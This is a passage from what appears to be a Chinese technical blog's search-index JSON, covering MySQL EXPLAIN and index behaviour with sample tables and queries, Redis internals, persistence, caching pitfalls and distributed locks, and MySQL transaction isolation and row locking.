如果是 utf8mb4 编码, 则是 4* n + 2 字节.\n- 数值类型:\n  - TINYINT: 1字节\n  - SMALLINT: 2字节\n  - MEDIUMINT: 3字节\n  - INT: 4字节\n  - BIGINT: 8字节\n- 时间类型\n  - DATE: 3字节\n  - TIMESTAMP: 4字节\n  - DATETIME: 8字节\n- 字段属性: NULL 属性 占用一个字节. 如果一个字段是 NOT NULL 的, 则没有此属性.\n\n\n\n### 1.4 Extra\n\n+ Using filesort\n  当 Extra 中有 `Using filesort` 时, 表示 MySQL 需额外的排序操作, 不能通过索引顺序达到排序效果. 一般有 `Using filesort`, 都建议优化去掉, 因为这样的查询 CPU 资源消耗大.\n\n+ Using index\n\n  \"覆盖索引扫描\", 表示查询在索引树中就可查找所需数据, 不用扫描表数据文件, 往往说明性能不错\n\n+ Using temporary\n\n  查询有使用临时表, 一般出现于排序, 分组和多表 join 的情况, 查询效率不高, 建议优化.\n\n\n\n### 1.5 构建数据\n\n```sql\nCREATE TABLE `user_info` (\n  `id`   BIGINT(20)  NOT NULL AUTO_INCREMENT,\n  `name` VARCHAR(50) NOT NULL DEFAULT '',\n  `age`  INT(11)              DEFAULT NULL,\n  PRIMARY KEY (`id`),\n  KEY `name_index` (`name`)\n)\n  ENGINE = InnoDB\n  DEFAULT CHARSET = utf8\n\nINSERT INTO user_info (name, age) VALUES ('xys', 20);\nINSERT INTO user_info (name, age) VALUES ('a', 21);\nINSERT INTO user_info (name, age) VALUES ('b', 23);\nINSERT INTO user_info (name, age) VALUES ('c', 50);\nINSERT INTO user_info (name, age) VALUES ('d', 15);\nINSERT INTO user_info (name, age) VALUES ('e', 20);\nINSERT INTO user_info (name, age) VALUES ('f', 21);\nINSERT INTO user_info (name, age) VALUES ('g', 23);\nINSERT INTO user_info (name, age) VALUES ('h', 50);\nINSERT INTO user_info (name, age) VALUES ('i', 15);\n\n\nCREATE TABLE `order_info` (\n  `id`           BIGINT(20)  NOT NULL AUTO_INCREMENT,\n  `user_id`      BIGINT(20)           DEFAULT NULL,\n  `product_name` VARCHAR(50) NOT NULL DEFAULT '',\n  `productor`    VARCHAR(30)          DEFAULT NULL,\n  PRIMARY KEY (`id`),\n  KEY `user_product_detail_index` (`user_id`, `product_name`, `productor`)\n)\n  ENGINE = InnoDB\n  DEFAULT CHARSET = utf8\n\nINSERT INTO order_info (user_id, product_name, productor) VALUES (1, 'p1', 'WHH');\nINSERT INTO order_info (user_id, product_name, productor) VALUES (1, 'p2', 'WL');\nINSERT INTO order_info (user_id, product_name, productor) VALUES (1, 'p1', 'DX');\nINSERT INTO order_info (user_id, product_name, productor) VALUES (2, 'p1', 'WHH');\nINSERT INTO order_info (user_id, product_name, productor) VALUES (2, 'p5', 'WL');\nINSERT INTO order_info (user_id, product_name, productor) VALUES (3, 'p3', 'MA');\nINSERT INTO order_info (user_id, product_name, productor) VALUES (4, 'p1', 'WHH');\nINSERT INTO order_info (user_id, product_name, productor) VALUES (6, 'p1', 'WHH');\nINSERT INTO order_info (user_id, product_name, productor) VALUES (9, 'p8', 'TE');\n```\n\n\n\n\n\n# 2. 测试\n\n```bash\ndocker run -d --name mysql-explain -e MYSQL_ROOT_PASSWORD=123456 mysql # 创建一个容器\n\ndocker exec -it mysql-explain mysql -u root -p  # 输入密码, 进入操作\n```\n\n### 2.1 数据初始化\n\n新建测试表，插入 10w 数据：\n\n```sql\nCREATE DATABASE test1;\nuse test1;\n\nCREATE TABLE `test` (  \n  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,\n  `a` int(11) NOT NULL,\n  `b` int(11) NOT NULL,\n  PRIMARY KEY (`id`)\n) ENGINE=InnoDB;\n\n-- 批量插入 10w 数据\nDROP PROCEDURE IF EXISTS batchInsert;\nDELIMITER $  \nCREATE PROCEDURE batchInsert() BEGIN DECLARE i INT DEFAULT 1;  \nSTART TRANSACTION; WHILE i<=100000  \nDO  \nINSERT INTO test (a,b) VALUES (i,i);  \nSET i=i+1; END WHILE;  \nCOMMIT; END $\n\nCALL batchInsert();  \n\n\nselect count(*) from test;\n-- 得到100000\n```\n\n### 2.2 全表查询\n\n目前默认只有一个主键索引，我们分析下全表查询：\n\n```\nmysql> explain select * from test;  \n```\n\n| id   | select_type | table | type | possible_keys | key  | key_len | ref  | rows   | Extra | partitions | filtered |\n| :--- | :---------- | :---- | :--- | :------------ | :--- | :------ | :--- | :----- | :---- | ---------- | -------- |\n| 1    | SIMPLE      | test  | ALL  | NULL          | NULL | NULL    | NULL | 100098 | NULL  | NULL       | 100.00   |\n\n其中 `type` 值为 ALL，表示全表扫描了，我们看到 `rows` 这个字段显示有 100098 条，实际上我们一共才 10w 条数据，说明这个字段只是 mysql 的一个预估，不总是准确的。\n\n### 2.3 索引查询\n\n接下来我们分别给字段 a 和 b 添加普通索引。\n\n```\nmysql> alter table test add index idx_a(a);  \nmysql> alter table test add index idx_b(b);  \n```\n\n看下下面这条 sql：\n\n```\nmysql> explain select * from test where a > 10000;  \n```\n\n| id   | select_type | table | type | possible_keys | key  | key_len | ref  | rows   | Extra       | filtered | partitions |\n| :--- | :---------- | :---- | :--- | :------------ | :--- | :------ | :--- | :----- | :---------- | -------- | ---------- |\n| 1    | SIMPLE      | test  | ALL  | idx_a         | NULL | NULL    | NULL | 100098 | Using where | 50.00    | NULL       |\n\n我们发现 `type` 竟然不是 index, 刚刚不是给字段 a 添加索引了么？还有 `possible_keys` 也显示了有 idx_a，但是 `key` 显示 null，表示实际上不会使用任何索引，这是为什么呢？\n\n这是因为 select * 的话还需要回到主键索引上查找 b 字段，这个过程叫`回表`。\n\n这条语句会从索引中查出 9w 条数据，也就是说这 9w 条数据都需要`回表`操作，全表扫描都才 10w 条数据，所以在 mysql 最后的决策是还不如直接全表扫描得了，至少还免去了回表过程了。\n\n\n\n```\nmysql> explain select a from test where a > 10000;  \n```\n\n| id   | select_type | table | type  | possible_keys | key   | key_len | ref  | rows  | Extra                         | filtered | partitions |\n| :--- | :---------- | :---- | :---- | :------------ | :---- | :------ | :--- | :---- | :---------------------------- | -------- | ---------- |\n| 1    | SIMPLE      | test  | range | idx_a         | idx_a | 4       | NULL | 50049 | Using where;<br/> Using index | 100.00   | NULL       |\n\n注意这次 `Extra` 的值为 Using where; Using index，表示查询用到了索引，且要查询的字段在索引中就能拿到，所以不需要回表，显然这种效率比上面的要高，这也是日常开发中不建议写 select * 的原因，尽量只查询业务所需的字段。\n\n\n\n当然，最后决策是否用索引不是固定的，mysql 会比较各种查询的代价，我们把上面的 sql 中 where 条件再稍微改造一下。\n\n```\nmysql> explain select * from test where a > 90000;  \n```\n\n| id   | select_type | table | type  | possible_keys | key   | key_len | ref  | rows  | Extra                 | filtered | partitions |\n| :--- | :---------- | :---- | :---- | :------------ | :---- | :------ | :--- | :---- | :-------------------- | -------- | ---------- |\n| 1    | SIMPLE      | test  | range | idx_a         | idx_a | 4       | NULL | 10000 | Using index condition | 100.00   | NULL       |\n\n再看这次 `type` 为 range 了，`key` 为 a_index，表示使用了 a 索引，如我们所愿了。这是因为满足这次索引中查出只有 10000 条数据，mysql 认为 10000 条数据就算回表也要比全表扫描的代价低，因而决定查索引。\n\n还有一点就是这次 `Extra` 字段中值为 Using index condition，这是指条件过滤的时候用到了索引，但因为是 select * ，所以还是需要回表。\n\n上面两条查询说明 mysql 会比较 `索引 + 回表` 和 `直接全表扫描`的查询性能，选择其中更好的作为最后的查询方式，这就是 mysql 优化器的作用了。\n\n### 2.4 排序查询\n\n再来看一个带排序的查询。\n\n```\nmysql> explain select a from test where a > 90000 order by b;  \n```\n\n| id   | select_type | table | type  | possible_keys | key   | key_len | ref  | rows  | Extra                                      | filtered | partitions |\n| :--- | :---------- | :---- | :---- | :------------ | :---- | :------ | :--- | :---- | :----------------------------------------- | -------- | ---------- |\n| 1    | SIMPLE      | test  | range | idx_a         | idx_a | 4       | NULL | 10000 | Using index condition;<br/> Using filesort | 100.00   | NULL       |\n\n我们知道索引本来就是有序带，但这个 `Extra` 中返回了一个 Using filesort，说明无法利用索引完成排序，需要从内存或磁盘进行排序，具体哪种排序 explain 是没有体现的。 \n\n总之，这种情况也是需要优化的，尽量能利用索引的有序性，比如下面：\n\n```\nmysql> explain select a from test where a > 90000 order by a;\n```\n\n| id   | select_type | table | type  | possible_keys | key   | key_len | ref  | rows | Extra                         | filtered | partitions |\n| :--- | :---------- | :---- | :---- | :------------ | :---- | :------ | :--- | :--- | :---------------------------- | -------- | ---------- |\n| 1    | SIMPLE      | test  | range | idx_a         | idx_a | 4       | NULL | 9999 | Using where;<br/> Using index | 100.00   | NULL       |\n\n这次 `Extra` 值有 Using index 了，表示使用上了索引。\n\n### 2.5 复合索引\n\n我们再创建一个复合索引看看。\n\n```\nmysql> alter table test drop index idx_a;\nmysql> alter table test drop index idx_b;\nmysql> alter table test add index idx_a_b(a,b);  \n```\n\n看下之前的查询 \n\n```\nmysql> explain select * from test where a > 10000;\n```\n\n| id   | select_type | table | type  | possible_keys | key     | key_len | ref  | rows  | Extra                         | filtered | partitions |\n| :--- | :---------- | :---- | :---- | :------------ | :------ | :------ | :--- | :---- | :---------------------------- | -------- | ---------- |\n| 1    | SIMPLE      | test  | range | idx_a_b       | idx_a_b | 4       | NULL | 50049 | Using where;<br/> Using index | 100.00   | NULL       |\n\n这条 sql 刚刚在没有创建复合索引的时候，是走的全表扫描，现在看 `Extra` 有 Using index，说明利用了覆盖索引，同样也免去了回表过程，即在 idx_a_b 索引上就能找出要查询的字段。\n\n# 3. 查看 sql 执行时间\n\n```bash\nset profiling = 1;\nshow profiles;\n```\n\n\n\n# 4. 参考资料\n\n+ https://blog.souche.com/mysql-explain/\n+ https://segmentfault.com/a/1190000008131735","tags":["mysql"],"categories":["sql"]},{"title":"redis学习","url":"%2Fp%2F2a86dce.html","content":"\n# 0. 前言\n\nRedis是一个开源的，**基于内存的数据结构存储**，可用作于数据库、**缓存**、消息中间件。\n\n- 从官方的解释上，我们可以知道：Redis是基于内存，支持多种数据结构。\n- 从经验的角度上，我们可以知道：Redis常用作于缓存。\n\n<!-- more -->\n\n# 1. Redis 底层数据结构\n\n\n+ 简单动态字符串(Simple dynamic string,SDS)\n\n+ 无环双向链表(linkedlist)\n\n+ 哈希表\n\n+ 跳跃表(shiplist)\n\n+ 整数集合(intset)\n\n+ 压缩列表(ziplist)\n\n# 2. Redis 数据对象\n\n首先还是得声明一下，Redis的存储是以`key-value`的形式的。Redis中的key一定是字符串，value可以是string、list、hash、set、sortset这几种常用的。\n\n| 类型    | 作用                                               | 底层数据结构          |\n| ------- | -------------------------------------------------- | --------------------- |\n| string  | 简单的key-value                                    | int, embstr(sds), raw |\n| list    | 有序列表,可做简单队列                              | 压缩列表,双向链表     |\n| hash    | 哈希表, 存储结构化数据                             | 压缩列表,哈希 table   |\n| set     | 无序列表(去重), 提供一系列的交集、并集、差集的命令 | 整数集合,哈希 table   |\n| sortset | 有序集合映射, 排行榜                               | 压缩列表, 跳跃表      |\n\n![1](redis学习/1.png)\n\n\n\n### 2.1 字符串(stirng)对象\n\n在上面的图我们知道string类型有三种**编码格式**：\n\n- int：整数值，这个整数值可以使用long类型来表示\n  + 如果是浮点数，那就用embstr或者raw编码。具体用哪个就看这个数的长度了\n\n- embstr：字符串值，这个字符串值的长度小于32字节\n\n- raw：字符串值，这个字符串值的长度大于32字节\n\nembstr和raw的**区别**：\n\n- raw分配内存和释放内存的次数是两次，embstr是一次\n- embstr编码的数据保存在一块**连续**的内存里面\n\n编码之间的**转换**：\n\n- int类型如果存的**不再是一个整数值**，则会从int转成raw\n- embstr是只读的，在修改的时候回从embstr转成raw\n\n\n\n### 2.2 列表(list)对象\n\n- ziplist：字符串元素的长度都小于64个字节`&&`总数量少于512个\n- linkedlist：字符串元素的长度大于64个字节`||`总数量大于512个\n\n编码之间的**转换：**\n\n- 原本是ziplist编码的，如果保存的数据长度太大或者元素数量过多，会转换成linkedlist编码的。\n\n\n\n### 2.3 哈希(hash)对象\n\n- ziplist：key和value的字符串长度都小于64字节`&&`键值对总数量小于512\n- hashtable：key和value的字符串长度大于64字节`||`键值对总数量大于512\n\n编码之间的**转换：**\n\n- 原本是ziplist编码的，如果保存的数据长度太大或者元素数量过多，会转换成hashtable编码的。\n\n\n\n### 1.4 集合(set)对象\n\n- intset：保存的元素全都是整数`&&`总数量小于512\n- hashtable：保存的元素不是整数`||`总数量大于512\n\n编码之间的**转换：**\n\n- 原本是intset编码的，如果保存的数据不是整数值或者元素数量大于512，会转换成hashtable编码的。\n\n\n\n### 2.5 有序集合(sortset)对象\n\n- ziplist：元素长度小于64`&&`总数量小于128\n- skiplist：元素长度大于64`||`总数量大于128\n\n有序集合(sortset)对象**同时采用skiplist和哈希表来实现**：\n\n- skiplist能够达到插入的时间复杂度为O(logn)，根据成员查分值的时间复杂度为O(1)\n\n编码之间的**转换：**\n\n- 原本是ziplist编码的，如果保存的数据长度大于64或者元素数量大于128，会转换成skiplist编码的。\n\n\n\n# 3. Redis 过期策略\n\nRedis服务器中也有数据库这么一个概念。如果不指定具体的数量，默认会有16个数据库(0-15)。数据库与数据库之间的数据是隔离的。\n\n### 3.1 过期时间\n\n因为我们的内存是有限的。所以我们会干掉不常用的数据，保留常用的数据。这就需要我们设置一下键的过期(生存)时间了。\n\n+ 设置键的 生存时间 可以通过EXPIRE或者PEXPIRE命令。\n\n+ 设置键的 过期时间 可以通过EXPIREAT或者PEXPIREAT命令。\n\n其实EXPIRE、PEXPIRE、EXPIREAT这三个命令都是通过PEXPIREAT命令来实现的。\n\n### 3.2 过期策略(3种)\n\n上面我们已经能够了解到：过期键是保存在哈希表中了。那这些过期键到了过期的时间，就会立马被删除掉吗？？\n\n- 定时删除(对内存友好，对CPU不友好)\n\n  到时间点上就把所有过期的键删除了。\n\n- 惰性删除(对CPU极度友好，对内存极度不友好)\n\n  每次从键空间取键的时候，判断一下该键是否过期了，如果过期了就删除。\n\n- 定期删除(折中)\n\n  每隔一段时间去删除过期键，限制删除的执行时长和频率。\n\n\nRedis采用的是**惰性删除+定期删除**两种策略，所以说，在Redis里边如果过期键到了过期的时间了，未必被立马删除的！\n\n\n\n### 3.3 内存淘汰机制(6种)\n\n我们可以设置内存最大使用量，当内存使用量超出时，会施行数据淘汰策略。\n\n![1](redis学习/2.png)\n\n\n\n\n一般场景, 使用 Redis 缓存数据时，为了提高缓存命中率，需要保证缓存数据都是热点数据。可以将内存最大使用量设置为热点数据占用的内存量，然后启用allkeys-lru淘汰策略，将最近最少使用的数据淘汰\n\n\n\n# 4. Redis 持久化\n\nRedis提供了两种不同的持久化方法来讲数据存储到硬盘里边。\n\n### 4.1 RDB(快照持久化)\n\nRDB持久化可以手动执行，也可以根据服务器配置定期执行。RDB持久化所生成的RDB文件是一个经过压缩的二进制文件，Redis可以将某一时刻的所有数据保存到一个RDB文件中dump.rdb。Redis服务器在启动的时候，如果发现有RDB文件，就会自动载入RDB文件(不需要人工干预)\n\n有两个命令可以生成RDB文件：\n\n+ SAVE\t会阻塞Redis服务器进程，服务器不能接收任何请求，直到RDB文件创建完毕为止。\n\n+ BGSAVE `fork`出一个子进程，由子进程来负责创建RDB文件，服务器进程可以继续接收请求。\n\n  \n\n我们可以使用配置的方式来定期执行, 如果以下的条件被触发，就会执行`BGSAVE` 命令\n\n```shell\nsave 900 1              #在900秒(15分钟)之后，至少有1个key发生变化，\nsave 300 10             #在300秒(5分钟)之后，至少有10个key发生变化\nsave 60 10000       \t  #在60秒(1分钟)之后，至少有10000个key发生变化\n```\n\n\n\n### 4.2 AOF(文件追加)\n\n当Redis服务器执行写命令的时候，将执行的写命令保存到AOF文件中。AOF是通过保存Redis服务器所执行的写命令来记录数据库的数据的。\n\n```shell\nredis> SET meg \"hello\"\nOK\nredis> SADD fruits \"apple\" \"banana\" \"cherry\"\n(integer) 3\nredis> RPUSH numbers 128 256 512\n(integer) 3 \n```\n\n\n\n每个命令都生成一条记录，存在 AOF 文件中。这些都是以Redis的命令请求协议格式保存的。读取的时候，再把这些命令执行一遍。\n\n\n```shell\nappendfsync always     # 每次有数据修改发生时都会写入AOF文件。\nappendfsync everysec   # 每秒钟同步一次，该策略为AOF的默认策略。\nappendfsync no         # 从不同步。高效但是数据不会被持久化。\n```\n\n\n\nRedis将AOF重写程序放到**子进程**里执行(`BGREWRITEAOF`命令)，像`BGSAVE`命令一样fork出一个子进程来完成重写AOF的操作，从而不会影响到主进程。\n\nAOF后台重写是不会阻塞主进程接收请求的，新的写命令请求可能会导致**当前数据库和重写后的AOF文件的数据不一致**！\n\n为了解决数据不一致的问题，Redis服务器设置了一个**AOF重写缓冲区**，这个缓存区会在服务器**创建出子进程之后使用**。\n\n\n\n### 4.3 RDB和AOF对过期键的策略\n\n+ RDB持久化对过期键的策略：\n  执行SAVE或者BGSAVE命令创建出的RDB文件，程序会对数据库中的过期键检查，已过期的键不会保存在RDB文件中。\n  载入RDB文件时，程序同样会对RDB文件中的键进行检查，过期的键会被忽略。\n\n+ AOF持久化对过期键的策略：\n  如果数据库的键已过期，但还没被惰性/定期删除，AOF文件不会因为这个过期键产生任何影响(也就说会保留)，当过期的键被删除了以后，会追加一条DEL命令来显示记录该键被删除了\n  重写AOF文件时，程序会对RDB文件中的键进行检查，过期的键会被忽略。\n\n+ RDB和AOF用哪个？\n\n  RDB和AOF并不互斥，它俩可以同时使用。\n\n  RDB的优点：载入时恢复数据快、文件体积小。\n  RDB的缺点：会一定程度上丢失数据(因为系统一旦在定时持久化之前出现宕机现象，此前没有来得及写入磁盘的数据都将丢失。)\n  AOF的优点：丢失数据少(默认配置只丢失一秒的数据)。\n  AOF的缺点：恢复数据相对较慢，文件体积大\n\n  如果Redis服务器同时开启了RDB和AOF持久化，服务器会优先使用AOF文件来还原数据(因为AOF更新频率比RDB更新频率要高，还原的数据更完善)\n\n\n\n# 5. Redis事件\n\nRedis服务器是一个事件驱动程序，主要处理以下两类事件：\n\n### 5.1 文件事件\n\n文件事件其实就是对Socket操作的抽象，Redis服务器与Redis客户端的通信会产生文件事件，服务器通过监听并处理这些事件来完成一系列的网络操作。\n\n文件事件处理器使用I/O多路复用（EPOLL）程序来同时监听多个Socket。当被监听的Socket准备好执行连接应答(accept)、读取(read)等等操作时，与操作相对应的文件事件就会产生，根据文件事件来为Socket关联对应的事件处理器，从而实现功能。\n\n\n\n### 5.2 时间事件\n\n持续运行的Redis服务器会**定期**对自身的资源和状态进行检查和调整，这些定期的操作由**serverCron**函数负责执行，它的主要工作包括：\n\n- 更新服务器的统计信息(时间、内存占用、数据库占用)\n- 清理数据库的过期键值对\n- AOF、RDB持久化\n- 如果是主从服务器，对从服务器进行定期同步\n- 如果是集群模式，对进群进行定期同步和连接\n- …\n\nRedis服务器将时间事件放在一个链表中，当时间事件执行器运行时，会遍历整个链表。时间事件包括：\n\n+ 周期性事件(Redis一般只执行serverCron时间事件，serverCron时间事件是周期性的)\n+ 定时事件\n\n\n\n### 5.3 Redis单线程为什么快？\n\n1）纯内存操作\n2）核心是基于非阻塞的IO多路复用机制\n3）单线程避免了多线程的频繁上下文切换问题\n\n\n\n\n\n# 6. Redis主从\n\n##### 完整重同步\n\n+ 从服务器向主服务器发送PSYNC命令\n\n+ 主服务器收到PSYNC命令执行`BGSAVE`命令，在后台生成一个`RDB`文件。并用一个缓冲区来记录从现在开始执行的所有写命令。\n\n+ 当主服务器的BGSAVE命令执行完后，将生成的RDB文件发送给从服务器，从服务器接收和载入RBD文件。将自己的数据库状态更新\n\n  至与主服务器执行BGSAVE命令时的状态。\n+ 主服务器将所有缓冲区的写命令发送给从服务器，从服务器执行这些写命令，达到数据最终一致性。\n\n##### 部分重同步\n\n复制偏移量：执行复制的双方都会分别维护一个复制偏移量\n主服务器每次传播N个字节，就将自己的复制偏移量加上N\n从服务器每次收到主服务器的N个字节，就将自己的复制偏移量加上N\n通过对比主从复制的偏移量，就很容易知道主从服务器的数据是否处于一致性的状态！\n\n//TODO:\n\n\n\n# 7. Redis 其他问题\n\n### 7.1 缓存雪崩\n\n+ Redis 挂掉了，请求全部走数据库。\n+ 对缓存数据设置相同的过期时间，导致某段时间内缓存失效，请求全部走数据库。\n+ 缓存雪崩如果发生了，很可能就把我们的数据库搞垮，导致整个服务瘫痪！\n\n\n如何解决缓存雪崩？\n\n+ 在缓存的时候给过期时间加上一个随机值，这样就会大幅度的减少缓存在同一时间过期。\n\n+ 实现 Redis 的高可用 (主从架构 + Sentinel 或者 Redis Cluster)，尽量避免 Redis 挂掉这种情况发生。\n+ 万一 Redis 真的挂了，我们可以设置本地缓存 (ehcache)+ 限流 (hystrix)，尽量避免我们的数据库被干掉 (起码能保证我们的服务还是能正常工作的)\n+ redis 持久化，重启后自动从磁盘上加载数据，快速恢复缓存数据。\n\n### 7.2 缓存穿透\n\n缓存穿透是指查询一个一定不存在的数据。由于缓存不命中，并且出于容错考虑，如果从数据库查不到数据则不写入缓存，这将导致这个不存在的数据每次请求都要到数据库去查询，失去了缓存的意义。\n\n\n解决缓存穿透也有两种方案：\n\n+ 由于请求的参数是不合法的(每次都请求不存在的参数)，于是我们可以使用布隆过滤器(BloomFilter)或者压缩filter提前拦截，不合法就不让这个请求到数据库层！\n\n  + 如何在海量元素中(10亿,不定长,不重复) 快速判断一个元素是否存在?\n\n    布隆: 多个 hash 函数, 对应多个 bit\n\n    布隆判断存在, 有可能是错的(别人的 hash 碰撞), 告诉我不存在, 就一定不存在, 先去布隆过滤器查询, 再去 redis\n\n+ 当我们从数据库找不到的时候，我们也将这个空对象设置到缓存里边去。下次再请求的时候，就可以从缓存里边获取了。\n  这种情况我们一般会将空对象设置一个较短的过期时间。\n\n\n\n### 7.3 缓存与数据库双写一致\n\n##### 7.3.1 一般来说，执行更新操作时，我们会有两种选择：\n\n+ 先操作数据库，再操作缓存\n+ 先操作缓存，再操作数据库\n\n\n\n##### 7.3.2 操作缓存也有两种方案：\n\n- 更新缓存\n- 删除缓存\n\n一般我们都是采取删除缓存缓存策略的，原因如下：\n\n1， 高并发环境下，无论是先操作数据库还是后操作数据库而言，如果加上更新缓存，那就更加容易导致数据库与缓存数据不一致问题。(删除缓存直接和简单很多)\n\n2， 如果每次更新了数据库，都要更新缓存【这里指的是频繁更新的场景，这会耗费一定的性能】，倒不如直接删除掉。等再次读取时，缓存里没有，那我到数据库找，在数据库找到再写到缓存里边(体现懒加载)\n\n基于这两点，对于缓存在更新时而言，都是建议执行删除操作！\n\n\n\n##### 7.3.3 先更新数据库，再删除缓存\n\n在高并发下表现不如意，在原子性被破坏时表现优异\n\n- 第一步成功(操作数据库)，第二步失败(删除缓存)，会导致**数据库里是新数据，而缓存里是旧数据**。\n- 如果第一步(操作数据库)就失败了，我们可以直接返回错误(Exception)，不会出现数据不一致。\n\n\n\n##### 7.3.4 先删除缓存，再更新数据库\n\n在高并发下表现不如意，在原子性被破坏时表现优异\n\n- 第一步成功(删除缓存)，第二步失败(更新数据库)，数据库和缓存的数据还是一致的。\n- 如果第一步(删除缓存)就失败了，我们可以直接返回错误(Exception)，数据库和缓存的数据还是一致的。\n\n\n\n# 8. 问题总结\n\n### 8.1 string用法\n\n+ 数据库表转换成 redis 结构, id 是主键\n\n  MSET user::{ID}::name liuwei\n\n  MGET user::{ID}::age 18\n\n+ 做阅读计数器\n\n  + incr readcount::{帖子 ID}\n  + get readcount::{帖子 ID} \n\n+ 分布式锁的思路\n\n  + setnx+expire命令 (错误的做法)\n\n    setnx和expire是分开的两步操作，不具有原子性，如果执行完第一条指令应用异常或者重启了，锁将无法过期。\n\n  ```shell\n  SETNX(\"lock\", 1) == 1 #成功获得锁\n  SETNX(\"lock\", 1) == 0 #有人占用资源获取失败\n  \n  DEL(\"lock\") #释放锁\n  PEXPIRE(\"lock\",1000)#设置个过期时间,防止无法释放锁\n  ```\n\n  + 使用 set key value [EX seconds][PX milliseconds][NX|XX] 命令 (正确做法)\n\n    ```\n    SET key value[EX seconds][PX milliseconds][NX|XX]\n    ```\n\n    - EX seconds: 设定过期时间，单位为秒\n    - PX milliseconds: 设定过期时间，单位为毫秒\n    - NX: 仅当key不存在时设置值\n    - XX: 仅当key存在时设置值\n\n    set命令的nx选项，就等同于setnx命令，代码过程如下：\n\n    ```\n    public boolean tryLock_with_set(String key, String UniqueId, int seconds) {\n        return \"OK\".equals(jedis.set(key, UniqueId, \"NX\", \"EX\", seconds));\n    }\n    ```\n\n    value必须要具有唯一性，我们可以用UUID来做，所以通常来说，在释放锁时，我们需要对value进行验证\n\n\n\n\n### 8.2 hash 用法\n\n+ 数据库表转换成 redis 结构, id 是主键\n\n  HMSET teacher 1::name levon 1::age 18\n\n  HMGET teacher 1::name 1::age\n\n### 8.3 list 用法\n\n+ 实现阻塞消息队列\n\n  LPUSH <=> BPROP\n\n### 8.4 set 用法\n\n+ 无序, 去重\n+ 微博关注关系\n\n### 8.5 zset 用法\n\n+ 排行榜\n\n+ zest 相同 score 怎么办?\n\n  默认字典排序\n\n\n\n# 9. redis pipeline\n\n+ redis的管道命令，允许client将多个请求依次发给服务器，过程中而不需要等待请求的回复，在最后再一并读取结果即可。\n\n+ pipeline不保证原子性\n\n```go\npackage main\n\nimport (\n    \"github.com/go-redis/redis\"\n    \"fmt\"\n)\n\nfunc main() {\n    client := redis.NewClusterClient(&redis.ClusterOptions{\n        Addrs: []string{\"192.168.120.110:6379\"},\n        ReadOnly: true,\n        RouteRandomly: true,\n    })\n\n    pipe := client.Pipeline()\n    pipe.HGetAll(\"1\")\n    pipe.HGetAll(\"2\")\n    pipe.HGetAll(\"3\")\n    cmders, err := pipe.Exec()\n    if err != nil {\n        fmt.Println(\"err\", err)\n    }\n    for _, cmder := range cmders {\n        cmd := cmder.(*redis.StringStringMapCmd)\n        strMap, err := cmd.Result()\n        if err != nil {\n            fmt.Println(\"err\", err)\n        }\n        fmt.Println(\"strMap\", strMap)\n    }\n}\n```\n\n\n\n# 10. 参考资料\n\n+ https://github.com/ZhongFuCheng3y/3y#tvredis\n\n","tags":["redis"],"categories":["sql"]},{"title":"mysql事务隔离级别和表锁行锁","url":"%2Fp%2F9762ea3e.html","content":"\n# 1. 事务\n\n### 1.1 事务的四大特性\n\n+ 原子性\n+ 一致性\n+ 隔离性\n+ 持久性\n\nmysql 默认是开启事务的, 因为有默认提交(autocommit=on).就是普通的 upddate 也是一个事务.\n\n<!-- more -->\n\n### 1.2 并发事务引起的问题\n\n+ 脏读\n另外一个事务没提交你就读到\n\n+ 不可重复读\n另外一个事务提交后你就读到,  update/delete\n\n+ 幻读\n新增了一个数据, 你读到了     insert\n\n### 1.3 事务隔离级别\n\n| 类型                         | 备注                                                         |\n| ---------------------------- | ------------------------------------------------------------ |\n| Read Uncommitted(RU)未提交读 | 不加锁                                                       |\n| Read Committed(RC)已提交读   | 解决脏读                                                     |\n| Repeatable Read(RR)可重复读  | 解决脏读, 不可重复读, innodb 解决了幻读(因为间隙锁不让别人插入) |\n| Serializable(SE) 串行化      | select隐式转为lock in share mode, 会和 update,delete 互斥  解决脏读, 不可重复读, 幻读 |\n\n### 1.4 事务隔离解决方案\n\n+ 读取数据前, 对其加锁, 阻止其他事务修改  LBCC(Lock Based Concurrency Control)\n+ (常用)生成数据请求时间点的一致性数据快照, 用快照提供一定级别的一致性读取 MVCC(Multi version Concurrency Control)   \n\n\n\n# 2. 锁\n\nmyisam 只支持表锁, innodb支持表锁和行锁.\n\n### 2.0 预热\n\n+ 普通的 select 语句(没有加锁后缀), innodb 不会加锁, 就算别人锁了, 你也可以读\n+ lock  in share mode 读锁, 只能读, 其他人不能改, 自己也不能改,  别人可以再加个读锁, 不能再加写锁\n+ 手动加锁的话, commit/rollback 释放锁\n+ delete/update/insert 默认自动加写锁\n\n\n\n### 2.1 锁的模式\n\n| 锁                 | 类别 | 使用                                                      |\n| ------------------ | ---- | --------------------------------------------------------- |\n| 共享锁(读锁)(S 锁) | 行锁 | select * from table where id = 1<br/>lock  in share mode; |\n| 排它锁(写锁)(X 锁) | 行锁 | select * from table where id = 1<br/>for update;          |\n| 意向共享锁         | 表锁 | 数据引擎自己维护,用户无法手动操作                         |\n| 意向排他锁         | 表锁 | 数据引擎自己维护,用户无法手动操作                         |\n\n加表锁的前提:\n\n+ 全表扫描, 确认表里没有行, 被其他事务加锁, 所以才能成功加表锁\n+ 意向锁类似一个标志, 能提高加 表锁 的效率\n\n\n\n### 2.2 行锁算法 \n\n假设数据是 1, 4, 7, 10\n\n| 算法                 | 描述                                            | 使用                                                         | 备注                         |\n| -------------------- | ----------------------------------------------- | :----------------------------------------------------------- | ---------------------------- |\n| Record Lock记录锁    | 唯一主键, 精准匹配                              | select * from t where id=4 for update; <br/>锁住 id=4        |                              |\n| Gap Lock间隙锁       | 完全避过了主键记录, 锁住数据不存在的区间        | select * from where id > 4 and id < 7 for update; <br/>锁住 (4-7) 的区间 (不包括4和7) | 为了不让插入                 |\n| Next-key Lock 临键锁 | = Record Lock + Gap Lock,包含记录和不存在的区间 | select * from where id > 5 and id < 9 for update;<br/>锁住 (4-7],  (7-10] 的区间 | 同时包含记录和区间, 两个都锁 |\n\n\n\n### 2.3 锁到底锁住了什么\n\n锁其实是锁住了索引\n\n+ 如果不使用索引\n走表锁\n\n\n+ 使用了索引\n走行锁, 锁住了是索引, 不是锁住了一行\n\n\n+ 但是为什么2个索引, 锁了一个索引, 第二个索引也被锁了?\n\n  因为索引分为两类: \n\n  聚集索引(主键/ Unique Not null/ _rowId 字段 )  存储索引和数据(B+树叶子节点)\n  二级索引 存储索引和主键值\n\n  所以对二级索引加锁, 也会导致对主键加锁, 因为二级索引要根据主键去 B+树 叶子节点找值\n\n\n\n### 2.4 意向锁\n\nInnoDB支持多粒度锁(multiple granularity 